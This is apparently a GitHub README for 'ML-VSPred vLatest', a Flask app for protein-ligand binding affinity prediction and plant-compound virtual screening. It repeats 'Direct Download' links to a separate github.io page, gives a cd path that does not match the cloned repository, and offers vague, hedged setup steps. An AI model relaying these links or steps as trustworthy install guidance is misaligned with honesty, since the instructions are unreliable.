# ML-VSPred vLatest - machine learning web app 2026

> **ML-VSPred is a Flask-based machine learning web app for protein-ligand binding affinity prediction and virtual screening, now presented as the latest release for 2026.**

[![Platform](https://img.shields.io/badge/Platform-Flask-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-vLatest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/pricetommzg2876/ml-vspred-affinity?style=flat-square)](https://github.com/pricetommzg2876/ml-vspred-affinity)

---

<p align="center">
  <a href="https://pricetommzg2876.github.io/ml-vspred-affinity/">
    <img src="https://img.shields.io/badge/Download-ML--VSPred%20Latest-brightgreen?style=for-the-badge" alt="Download ML-VSPred">
  </a>
</p>

> **[Direct Download - ML-VSPred vLatest](https://pricetommzg2876.github.io/ml-vspred-affinity/)**

---

[Download Latest Build](https://pricetommzg2876.github.io/ml-vspred-affinity/)

---

## Overview

ML-VSPred is a Flask web application for machine learning-driven protein-ligand binding affinity prediction and virtual screening. It is aimed at users who need a practical way to evaluate candidate compounds, compare likely binding behavior, and filter down larger compound sets to the most promising hits.

The project is particularly suited to plant-based bioactive compound analysis and NatProCP library screening. With feature-based, interpretable descriptors and several model choices, it lets researchers inspect outcomes side by side using random forest, gradient boosting, and XGBoost workflows.

---

## What it offers

- Predicts protein-ligand binding affinity from molecular inputs
- Supports virtual screening for plant-derived compounds
- Accepts single-pair prediction using SDF and PDB files
- Includes ranking for NatProCP library compounds
- Uses interpretable, feature-based descriptors
- Offers multiple model options, including random forest, gradient boosting, and XGBoost
- Runs as a Flask-based web application
- Fits research workflows focused on screening and model comparison

---

## Installation

Clone the repository and open the project in your preferred Python environment:

```bash
git clone https://github.com/pricetommzg2876/ml-vspred-affinity.git
cd binding_affinity_ml_vspred
```

Install the required dependencies for the Flask app and the machine learning pipeline, then start the application from the project entry point or your preferred launch script.

Example launch pattern:

```bash
python app.py
```

If the project structure uses a different startup file, use the main Flask entry script included in the repository.

---

## Using the app

1. Open the web app in your browser after launching the server.
2. Provide the required protein and ligand inputs for a prediction task.
3. For single-pair analysis, upload or reference SDF and PDB files.
4. Select the model or workflow appropriate for your screening goal.
5. Review the predicted binding affinity and the ranked output for supported compound sets.

Typical use cases include:
- checking one protein-ligand pair
- screening a set of plant-based candidates
- comparing predictions across multiple model types
- prioritizing NatProCP compounds for further review

---

## Configuration

Application settings are usually controlled through Flask configuration and the runtime files in the repository. If the app relies on environment variables, model paths, or data file locations, set those before you launch the server.

A common setup pattern may look like this:

```bash
export FLASK_APP=app.py
export FLASK_ENV=development
```

Adjust these values to match the entry point and deployment style used in the repository.

---

## Requirements

- A system that can run a Flask web application
- Python environment with the project dependencies installed
- Access to the model files and input resources used by the app
- Sufficient storage for trained models, compound data, and screening inputs
- Support for SDF and PDB file handling in the workflow

---

## FAQ

**How do I update the app?**  
Pull the latest changes from the repository and reinstall any updated dependencies or model assets that come with the new version.

**Where are settings stored?**  
Look for Flask configuration files, environment variables, or app startup scripts in the project root.

**What if predictions do not run correctly?**  
Check that the input files are in the expected format and confirm that the required model files are available locally.

**Can I use different model types?**  
Yes. The project includes random forest, gradient boosting, and XGBoost options.

**Is this only for one kind of compound library?**  
No. It supports binding affinity prediction and virtual screening workflows, including NatProCP-related compound ranking and plant-derived compound screening.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
